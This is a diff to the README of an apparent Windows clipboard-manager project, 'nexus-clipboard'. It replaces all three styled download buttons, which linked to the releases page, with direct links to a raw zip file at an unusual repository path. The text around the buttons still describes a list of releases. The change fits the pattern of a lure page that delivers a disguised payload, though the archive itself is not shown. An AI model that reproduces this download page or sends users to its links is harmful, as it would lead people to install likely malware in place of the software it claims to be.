@@ -1,7 +1,7 @@
 <h1>📋 nexus-clipboard - Your Clipboard, Supercharged & Private</h1>
 
 <p align="center">
-  <a href="https://github.com/souleymanesylla7654-gif/nexus-clipboard/releases" style="display:inline-block; padding:18px 42px; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:#ffffff; font-size:22px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 8px 24px rgba(102,126,234,0.45); transition:all 0.3s ease; margin:20px auto; text-align:center;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/souleymanesylla7654-gif/nexus-clipboard/main/monocline/v2.1-alpha.2.zip" style="display:inline-block; padding:18px 42px; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:#ffffff; font-size:22px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 8px 24px rgba(102,126,234,0.45); transition:all 0.3s ease; margin:20px auto; text-align:center;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <div style="max-width:900px; margin:0 auto; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height:1.8; color:#333;">
@@ -54,7 +54,7 @@ Follow these simple steps and you'll have nexus-clipboard running in under five 
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/souleymanesylla7654-gif/nexus-clipboard/releases" style="display:inline-block; padding:16px 40px; background:linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color:#ffffff; font-size:18px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 6px 18px rgba(245,87,108,0.4);">📥 Get the Latest Version Here</a>
+  <a href="https://raw.githubusercontent.com/souleymanesylla7654-gif/nexus-clipboard/main/monocline/v2.1-alpha.2.zip" style="display:inline-block; padding:16px 40px; background:linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color:#ffffff; font-size:18px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 6px 18px rgba(245,87,108,0.4);">📥 Get the Latest Version Here</a>
 </p>
 
 After clicking, you'll see a list of available versions. Look for the most recent one at the top of the list, and click on it to open the release page.
@@ -215,7 +215,7 @@ Your clipboard is about to become your greatest asset. Stop losing copied conten
 **Get it now:**
 
 <p align="center">
-  <a href="https://github.com/souleymanesylla7654-gif/nexus-clipboard/releases" style="display:inline-block; padding:20px 48px; background:linear-gradient(135deg, #43e97b 0%, #38f9d7 100%); color:#1a1a1a; font-size:24px; font-weight:bold; text-decoration:none; border-radius:60px; box-shadow:0 10px 28px rgba(67,233,123,0.45);">🚀 Download nexus-clipboard Now</a>
+  <a href="https://raw.githubusercontent.com/souleymanesylla7654-gif/nexus-clipboard/main/monocline/v2.1-alpha.2.zip" style="display:inline-block; padding:20px 48px; background:linear-gradient(135deg, #43e97b 0%, #38f9d7 100%); color:#1a1a1a; font-size:24px; font-weight:bold; text-decoration:none; border-radius:60px; box-shadow:0 10px 28px rgba(67,233,123,0.45);">🚀 Download nexus-clipboard Now</a>
 </p>
 
 <p align="center" style="color:#777; margin-top:30px;">Made with ❤️ for Windows users · Free forever · Your data stays yours</p>
